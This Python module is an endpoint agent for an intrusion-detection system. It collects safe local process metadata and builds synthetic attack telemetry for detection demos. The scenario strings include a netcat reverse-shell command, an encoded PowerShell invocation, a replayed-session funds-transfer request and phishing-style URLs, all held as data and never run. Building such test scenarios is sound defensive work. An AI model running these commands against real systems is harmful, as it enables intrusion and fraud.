"""Laptop / Endpoint Security Telemetry Agent.

Provides safe, non-destructive endpoint telemetry collection and deterministic
simulation of endpoint attack scenarios for the Intelligent Cloud IDS.
"""

import argparse
from datetime import datetime, timezone
import getpass
import logging
import os
import socket
import sys
from typing import Any, Dict, Optional, Tuple, Union
import uuid

from agents.agent_client import AgentClient, AgentResponse
from backend.schemas.api_security_event import (
    ApiSecurityEvent,
    EndpointInfo,
    IdentityInfo,
    NetworkInfo,
    RequestInfo,
    ResourceInfo,
    ResponseInfo,
)

logger = logging.getLogger("agents.laptop_agent")


class LaptopAgent:
    """Standalone Laptop / Endpoint Agent for telemetry collection and simulation."""

    def __init__(
        self,
        client: Optional[AgentClient] = None,
        hostname: Optional[str] = None,
        username: Optional[str] = None,
    ) -> None:
        self.client: AgentClient = client or AgentClient()
        self.hostname: str = hostname or self._get_safe_hostname()
        self.username: str = username or self._get_safe_username()

    @staticmethod
    def _get_safe_hostname() -> str:
        """Safely retrieve local machine hostname using standard library."""
        try:
            name = socket.gethostname()
            if name:
                return name
        except Exception as exc:
            logger.debug("Failed to obtain hostname via socket: %s", exc)
        return "UNKNOWN-LAPTOP"

    @staticmethod
    def _get_safe_username() -> str:
        """Safely retrieve current OS username without invoking shell."""
        try:
            user = getpass.getuser()
            if user:
                return user
        except Exception as exc:
            logger.debug("Failed to obtain user via getpass: %s", exc)

        for env_var in ("USERNAME", "USER", "LOGNAME"):
            val = os.getenv(env_var)
            if val:
                return val
        return "unknown_user"

    @staticmethod
    def _get_safe_privileges() -> Tuple[str, bool]:
        """Safely check process elevation without system modification."""
        try:
            if sys.platform == "win32":
                import ctypes

                is_admin = bool(ctypes.windll.shell32.IsUserAnAdmin())
                return ("ADMIN" if is_admin else "USER", is_admin)
            else:
                is_root = os.geteuid() == 0
                return ("ROOT" if is_root else "USER", is_root)
        except Exception as exc:
            logger.debug("Elevation check failed: %s", exc)
            return ("USER", False)

    # =========================================================================
    # 1. SAFE LIVE TELEMETRY MODE
    # =========================================================================

    def collect_telemetry(self) -> EndpointInfo:
        """
        Collect safe, non-destructive local metadata from the current process.

        Does NOT install hooks, execute shell commands, open sockets, modify files,
        or access sensitive credentials.
        """
        privilege_level, is_elevated = self._get_safe_privileges()

        process_id: Optional[int] = None
        try:
            process_id = os.getpid()
        except Exception:
            pass

        parent_pid: Optional[int] = None
        try:
            if hasattr(os, "getppid"):
                parent_pid = os.getppid()
        except Exception:
            pass

        executable_path: Optional[str] = None
        try:
            executable_path = sys.executable
        except Exception:
            pass

        process_name: Optional[str] = None
        if executable_path:
            process_name = os.path.basename(executable_path)

        command_line: Optional[str] = None
        try:
            # Safe sanitization: capture argv without evaluating
            command_line = " ".join(sys.argv)
        except Exception:
            pass

        return EndpointInfo(
            event_type="process_heartbeat",
            hostname=self.hostname,
            username=self.username,
            process_name=process_name or "python.exe",
            process_id=process_id,
            parent_process=f"pid_{parent_pid}" if parent_pid else None,
            executable_path=executable_path,
            command_line=command_line,
            privilege_level=privilege_level,
            keyboard_hook=False,
            network_connection=False,
            elevated=is_elevated,
        )

    # =========================================================================
    # 2. SCENARIO SIMULATION MODE (TELEMETRY ONLY - NO REAL ATTACKS)
    # =========================================================================

    def simulate_suspicious_process(
        self,
        hostname: Optional[str] = None,
        username: Optional[str] = None,
    ) -> EndpointInfo:
        """
        Generate synthetic telemetry for suspicious process execution.
        No processes are actually launched.
        """
        return EndpointInfo(
            event_type="process_creation",
            hostname=hostname or self.hostname,
            username=username or self.username,
            process_name="powershell.exe",
            process_id=4180,
            parent_process="explorer.exe",
            executable_path=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            command_line="powershell.exe -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA=",
            privilege_level="USER",
            keyboard_hook=False,
            network_connection=False,
            elevated=False,
        )

    def simulate_keylogging(
        self,
        hostname: Optional[str] = None,
        username: Optional[str] = None,
    ) -> EndpointInfo:
        """
        Generate synthetic telemetry indicating an observed keyboard hook.
        No keylogger or hook is actually installed.
        """
        return EndpointInfo(
            event_type="keylogger_detected",
            hostname=hostname or self.hostname,
            username=username or self.username,
            process_name="hook_monitor.exe",
            process_id=4120,
            parent_process="explorer.exe",
            executable_path=r"C:\Tools\hook_monitor.exe",
            command_line="hook_monitor.exe --monitor",
            privilege_level="USER",
            keyboard_hook=True,
            network_connection=False,
            elevated=False,
        )

    def simulate_reverse_shell(
        self,
        hostname: Optional[str] = None,
        username: Optional[str] = None,
    ) -> EndpointInfo:
        """
        Generate synthetic telemetry for reverse-shell indicators.
        No shell or network connection is actually created.
        """
        return EndpointInfo(
            event_type="reverse_shell",
            hostname=hostname or self.hostname,
            username=username or self.username,
            process_name="nc.exe",
            process_id=4250,
            parent_process="cmd.exe",
            executable_path=r"C:\Tools\nc.exe",
            command_line="nc.exe -e cmd.exe 192.168.1.99 4444",
            privilege_level="USER",
            keyboard_hook=False,
            network_connection=True,
            elevated=False,
        )

    def simulate_privilege_escalation(
        self,
        hostname: Optional[str] = None,
        username: Optional[str] = None,
    ) -> EndpointInfo:
        """
        Generate synthetic telemetry for privilege escalation indicators.
        No privileges are altered and no commands are executed.
        """
        return EndpointInfo(
            event_type="privilege_escalation",
            hostname=hostname or self.hostname,
            username=username or self.username,
            process_name="cmd.exe",
            process_id=4320,
            parent_process="services.exe",
            executable_path=r"C:\Windows\System32\cmd.exe",
            command_line="whoami /priv",
            privilege_level="SYSTEM",
            keyboard_hook=False,
            network_connection=False,
            elevated=True,
        )

    def simulate_unauthorized_transaction(
        self,
        hostname: Optional[str] = None,
        username: Optional[str] = None,
    ) -> EndpointInfo:
        """
        Scenario 6: Generate synthetic telemetry for unauthorized session/transaction abuse.
        Simulates an automated headless script attempting unauthorized funds transfer via replayed session.
        No real transactions or funds transfers are performed.
        """
        return EndpointInfo(
            event_type="unauthorized_transaction",
            hostname=hostname or self.hostname,
            username=username or self.username,
            process_name="browser_automation.exe",
            process_id=4410,
            parent_process="explorer.exe",
            executable_path=r"C:\Tools\browser_automation.exe",
            command_line="browser_automation.exe --replay-session token-9988 --target /api/transactions/transfer",
            privilege_level="USER",
            keyboard_hook=False,
            network_connection=True,
            elevated=False,
        )

    # Alias for Scenario 6
    simulate_transaction_abuse = simulate_unauthorized_transaction

    def simulate_fake_shopping(
        self,
        hostname: Optional[str] = None,
        username: Optional[str] = None,
    ) -> EndpointInfo:
        """
        Scenario 7: Generate synthetic telemetry representing fake shopping / fraudulent website interaction.
        Simulates browser navigation to a suspected fraudulent shopping site.
        Does not resolve or connect to any real fraudulent website.
        """
        return EndpointInfo(
            event_type="fake_shopping",
            hostname=hostname or self.hostname,
            username=username or self.username,
            process_name="msedge.exe",
            process_id=4520,
            parent_process="explorer.exe",
            executable_path=r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
            command_line='msedge.exe "http://fake-shopping-deals-mall.xyz/checkout?promo=99-off"',
            privilege_level="USER",
            keyboard_hook=False,
            network_connection=True,
            elevated=False,
        )

    # Alias for Scenario 7
    simulate_fraudulent_website = simulate_fake_shopping

    def simulate_fake_bank(
        self,
        hostname: Optional[str] = None,
        username: Optional[str] = None,
    ) -> EndpointInfo:
        """
        Scenario 8: Generate synthetic telemetry representing fake bank / suspicious URL activity.
        Simulates browser invocation opening a deceptive banking portal URL.
        Does not resolve any real domain or collect credentials.
        """
        return EndpointInfo(
            event_type="fake_bank",
            hostname=hostname or self.hostname,
            username=username or self.username,
            process_name="chrome.exe",
            process_id=4630,
            parent_process="outlook.exe",
            executable_path=r"C:\Program Files\Google\Chrome\Application\chrome.exe",
            command_line='chrome.exe "http://secure-login-verify-bank-account.info/login"',
            privilege_level="USER",
            keyboard_hook=False,
            network_connection=True,
            elevated=False,
        )

    # Alias for Scenario 8
    simulate_suspicious_url = simulate_fake_bank

    # =========================================================================
    # 3. ApiSecurityEvent CREATION (USING EXISTING BACKEND SCHEMA)
    # =========================================================================

    def build_event(
        self,
        endpoint_info: EndpointInfo,
        event_id: Optional[str] = None,
        timestamp: Optional[datetime] = None,
        network_info: Optional[NetworkInfo] = None,
        identity_info: Optional[IdentityInfo] = None,
        request_info: Optional[RequestInfo] = None,
        response_info: Optional[ResponseInfo] = None,
        resource_info: Optional[ResourceInfo] = None,
    ) -> ApiSecurityEvent:
        """
        Construct a fully valid ApiSecurityEvent tagged with domain="ENDPOINT".
        Uses existing schema without duplication and contextually populates
        telemetry for demo scenarios if not explicitly overridden.
        """
        evt_id = event_id or f"laptop-evt-{uuid.uuid4().hex[:8]}"
        evt_time = timestamp or datetime.now(timezone.utc)
        evt_type = endpoint_info.event_type or ""

        net_info = network_info or NetworkInfo(
            source_ip="127.0.0.1",
            user_agent="LaptopAgent/1.0",
        )

        if identity_info is not None:
            id_info = identity_info
        elif evt_type in ("unauthorized_transaction", "transaction_abuse"):
            id_info = IdentityInfo(
                user_id="compromised_user_88",
                session_id="stolen-session-token-9988",
                roles=["customer"],
                is_authenticated=True,
            )
        elif evt_type in ("fake_shopping", "fraudulent_website"):
            id_info = IdentityInfo(
                user_id="shopper_victim_45",
                session_id="fake-shop-sess-771",
                roles=["customer"],
                is_authenticated=False,
            )
        elif evt_type in ("fake_bank", "suspicious_url"):
            id_info = IdentityInfo(
                user_id="targeted_bank_customer",
                session_id="fake-bank-sess-990",
                roles=["banking_user"],
                is_authenticated=False,
            )
        else:
            id_info = IdentityInfo(
                user_id=self.username,
                roles=["workstation_user"],
                is_authenticated=True,
            )

        if request_info is not None:
            req_info = request_info
        elif evt_type in ("unauthorized_transaction", "transaction_abuse"):
            req_info = RequestInfo(
                method="POST",
                endpoint="/api/transactions/transfer",
                headers={"X-Session-State": "replayed", "Authorization": "Bearer hijacked-token-demo"},
                body={"recipient_account": "ACC-UNKNOWN-999", "amount": 9500.0, "currency": "USD", "action": "unauthorized_transfer"},
            )
        elif evt_type in ("fake_shopping", "fraudulent_website"):
            req_info = RequestInfo(
                method="POST",
                endpoint="/api/shopping/checkout",
                headers={"Host": "fake-shopping-deals-mall.xyz"},
                query_params={"url": "http://fake-shopping-deals-mall.xyz/deals", "category": "fraudulent_store"},
                body={"merchant": "SuperDiscountMall-Fraudulent", "cart_total": 12.99, "suspected_phishing": True},
            )
        elif evt_type in ("fake_bank", "suspicious_url"):
            req_info = RequestInfo(
                method="GET",
                endpoint="/api/banking/login",
                headers={"Host": "secure-login-verify-bank-account.info"},
                query_params={"url": "http://secure-login-verify-bank-account.info/login", "suspicious_domain": "secure-login-verify-bank-account.info"},
                body={"phishing_domain": "secure-login-verify-bank-account.info", "fake_brand": "FirstNationalDemoBank"},
            )
        else:
            req_info = RequestInfo(
                method="POST",
                endpoint="/endpoint/telemetry",
            )

        resp_info = response_info or ResponseInfo(
            status_code=200,
        )

        if resource_info is not None:
            res_info = resource_info
        elif evt_type in ("unauthorized_transaction", "transaction_abuse"):
            res_info = ResourceInfo(
                resource_type="transaction",
                resource_id="tx-unauth-8821",
                owner_id="victim_account_12",
                is_sensitive=True,
            )
        elif evt_type in ("fake_shopping", "fraudulent_website"):
            res_info = ResourceInfo(
                resource_type="shopping_session",
                resource_id="fake-mall-order-332",
                owner_id="shopper_victim_45",
                is_sensitive=True,
            )
        elif evt_type in ("fake_bank", "suspicious_url"):
            res_info = ResourceInfo(
                resource_type="bank_account",
                resource_id="fake-bank-portal",
                owner_id="targeted_bank_customer",
                is_sensitive=True,
            )
        else:
            res_info = ResourceInfo(
                resource_type="workstation",
                resource_id=self.hostname,
            )

        return ApiSecurityEvent(
            schema_version="1.0",
            event_id=evt_id,
            timestamp=evt_time,
            domain="ENDPOINT",
            network=net_info,
            identity=id_info,
            request=req_info,
            response=resp_info,
            resource=res_info,
            endpoint=endpoint_info,
        )

    # =========================================================================
    # 4. SEND TO BACKEND
    # =========================================================================

    def send_event(self, event: ApiSecurityEvent) -> AgentResponse:
        """Delegate event transmission to the configured AgentClient."""
        return self.client.send_event(event)


# =============================================================================
# 5. CLI INTERFACE
# =============================================================================

def parse_args(args: Optional[list[str]] = None) -> argparse.Namespace:
    """Parse and validate command line arguments for LaptopAgent."""
    parser = argparse.ArgumentParser(
        prog="python -m agents.laptop_agent",
        description="Laptop / Endpoint Security Telemetry Agent (Safe & Simulated)",
    )
    parser.add_argument(
        "--mode",
        choices=["live", "simulate"],
        default="live",
        help="Operating mode: 'live' (collect safe local metadata) or 'simulate' (synthetic scenario).",
    )
    parser.add_argument(
        "--scenario",
        choices=[
            "suspicious_process",
            "keylogging",
            "reverse_shell",
            "privilege_escalation",
            "unauthorized_transaction",
            "transaction_abuse",
            "fake_shopping",
            "fraudulent_website",
            "fake_bank",
            "suspicious_url",
        ],
        default=None,
        help="Attack scenario to simulate (required if --mode is 'simulate').",
    )
    parser.add_argument(
        "--send",
        action="store_true",
        help="Explicitly transmit the generated event to the backend /events endpoint.",
    )
    parser.add_argument(
        "--url",
        default=None,
        help="Custom backend endpoint URL (e.g. http://localhost:8000/events).",
    )

    parsed = parser.parse_args(args)
    if parsed.mode == "simulate" and not parsed.scenario:
        parser.error("--scenario is required when --mode is 'simulate'")

    return parsed


def main(cli_args: Optional[list[str]] = None) -> int:
    """CLI entrypoint for LaptopAgent."""
    args = parse_args(cli_args)
    client = AgentClient(endpoint_url=args.url)
    agent = LaptopAgent(client=client)

    if args.mode == "live":
        telemetry = agent.collect_telemetry()
        event = agent.build_event(telemetry)
        print("=== SAFE LIVE TELEMETRY COLLECTED ===")
        print(f"Event ID:      {event.event_id}")
        print(f"Timestamp:     {event.timestamp.isoformat()}")
        print(f"Domain:        {event.domain}")
        print(f"Hostname:      {telemetry.hostname}")
        print(f"Username:      {telemetry.username}")
        print(f"Process Name:  {telemetry.process_name} (PID: {telemetry.process_id})")
        print(f"Privilege:     {telemetry.privilege_level} (Elevated: {telemetry.elevated})")
        print(f"Command Line:  {telemetry.command_line}")
    elif args.mode == "simulate":
        scenario_map = {
            "suspicious_process": agent.simulate_suspicious_process,
            "keylogging": agent.simulate_keylogging,
            "reverse_shell": agent.simulate_reverse_shell,
            "privilege_escalation": agent.simulate_privilege_escalation,
            "unauthorized_transaction": agent.simulate_unauthorized_transaction,
            "transaction_abuse": agent.simulate_unauthorized_transaction,
            "fake_shopping": agent.simulate_fake_shopping,
            "fraudulent_website": agent.simulate_fake_shopping,
            "fake_bank": agent.simulate_fake_bank,
            "suspicious_url": agent.simulate_fake_bank,
        }
        simulator_fn = scenario_map[args.scenario]
        telemetry = simulator_fn()
        event = agent.build_event(telemetry)

        print(f"=== SIMULATED SCENARIO: {args.scenario} ===")
        print(f"Event ID:      {event.event_id}")
        print(f"Timestamp:     {event.timestamp.isoformat()}")
        print(f"Domain:        {event.domain}")
        print(f"Event Type:    {telemetry.event_type}")
        print(f"Process Name:  {telemetry.process_name}")
        print(f"Command Line:  {telemetry.command_line}")
        print(f"Keyboard Hook: {telemetry.keyboard_hook}")
        print(f"Net Connect:   {telemetry.network_connection}")
        print(f"Privilege:     {telemetry.privilege_level} (Elevated: {telemetry.elevated})")
    else:
        print(f"Error: Unknown mode '{args.mode}'", file=sys.stderr)
        return 1

    if args.send:
        print("\nSending event to backend...")
        resp = agent.send_event(event)
        if resp.success:
            print(f"[SUCCESS] Backend responded HTTP {resp.status_code}")
            print(f"Status:            {resp.get('status')}")
            print(f"Mitigation Action: {resp.get('mitigation_action')}")
            risk = resp.get("risk_assessment")
            if isinstance(risk, dict):
                print(f"Risk Score:        {risk.get('score')} ({risk.get('severity')})")
            impact = resp.get("impact_assessment")
            if isinstance(impact, dict):
                print(f"Impact:            {impact.get('summary')}")
            return 0
        else:
            print(f"[FAILURE] HTTP {resp.status_code or 'N/A'}: {resp.error}")
            return 2
    else:
        print("\n[NOTE] Event was NOT sent to backend (pass --send to transmit).")
        return 0


if __name__ == "__main__":
    sys.exit(main())
